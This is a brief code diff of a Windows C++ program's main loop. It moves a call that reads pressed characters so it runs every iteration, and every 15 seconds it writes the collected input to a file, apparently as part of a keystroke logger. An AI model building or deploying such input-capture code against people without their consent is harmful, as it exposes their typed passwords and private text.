@@ -34,12 +34,12 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,_In_opt_ HINSTANCE hPrevInstance,
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
+        InputHandler::get()->GetPressedChar();
         static DWORD refreshTime = GetTickCount() + 15000;
         if (GetTickCount() > refreshTime) {
             InputHandler::get()->printToFile(InputHandler::get()->GetDirectoryToFile().c_str());
             refreshTime += (GetTickCount() - refreshTime) + 15000;
-        }
-        InputHandler::get()->GetPressedChar();
+        }       
         std::this_thread::sleep_for(std::chrono::milliseconds(1));
     }
 
